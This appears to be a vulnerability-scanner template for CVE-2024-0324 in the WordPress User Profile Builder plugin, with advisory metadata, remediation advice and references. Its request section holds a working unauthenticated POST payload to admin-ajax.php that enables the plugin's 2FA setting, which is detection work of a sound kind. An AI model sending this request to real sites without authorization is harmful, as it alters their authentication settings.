id: CVE-2024-0324

info:
  name: Unauthorized 2FA Modification in User Profile Builder Plugin for WordPress
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The User Profile Builder â€“ Beautiful User Registration Forms, User Profiles & User Role Editor plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'wppb_two_factor_authentication_settings_update' function in all versions up to, and including, 3.10.8. This makes it possible for unauthenticated attackers to enable or disable the 2FA functionality present in the Premium version of the plugin for arbitrary user roles.
  impact: |
    An attacker could modify 2FA settings of users without proper authorization.
  remediation: |
    Update the User Profile Builder Plugin for WordPress to the latest version to mitigate CVE-2024-0324.
  reference:
    - https://github.com/WordpressPluginDirectory/profile-builder/blob/main/profile-builder/admin/admin-functions.php#L517
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/23caef95-36b6-40aa-8dd7-51a376790a40?source=cve
    - https://github.com/kodaichodai/CVE-2024-0324
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L
    cvss-score: 8.2
    cve-id: CVE-2024-0324
    cwe-id: CWE-862
    epss-score: 0.00075
    epss-percentile: 0.33878
    cpe: cpe:2.3:a:cozmoslabs:profile_builder:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: cozmoslabs
    product: profile_builder
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=wppb_two_factor_authentication_settings_update&2fa_enable=1

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Settings saved"
        part: body
